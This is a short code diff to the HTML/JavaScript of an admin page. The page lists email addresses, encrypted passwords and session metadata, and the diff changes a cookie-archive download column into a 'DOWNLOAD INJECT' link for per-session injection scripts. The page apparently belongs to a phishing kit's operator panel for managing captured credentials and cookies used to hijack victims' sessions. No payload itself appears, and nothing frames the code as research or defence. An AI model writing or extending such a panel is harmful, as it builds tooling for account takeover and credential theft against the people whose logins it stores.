@@ -583,7 +583,7 @@
                     <tr>
                         <th>EMAIL ADDRESS</th>
                         <th>ENCRYPTED PASSWORD</th>
-                        <th>COOKIE ARCHIVE</th>
+                        <th>INJECTION SCRIPT</th>
                         <th>SESSION METADATA</th>
                     </tr>
                 </thead>
@@ -763,10 +763,13 @@
                             </div>
                         </td>
                         <td>
-                            <a href="/api/admin/download/${session.filename}?token=${encodeURIComponent(getStoredToken())}" 
-                               class="download-btn" download>
-                                DOWNLOAD
-                            </a>
+                            ${session.injectFilename ? 
+                                `<a href="/api/admin/download-inject/${session.injectFilename}?token=${encodeURIComponent(getStoredToken())}" 
+                                   class="download-btn" download>
+                                    DOWNLOAD INJECT
+                                </a>` :
+                                `<span style="color: #666;">NO INJECT SCRIPT</span>`
+                            }
                         </td>
                         <td>
                             <div>ID: ${session.id}</div>
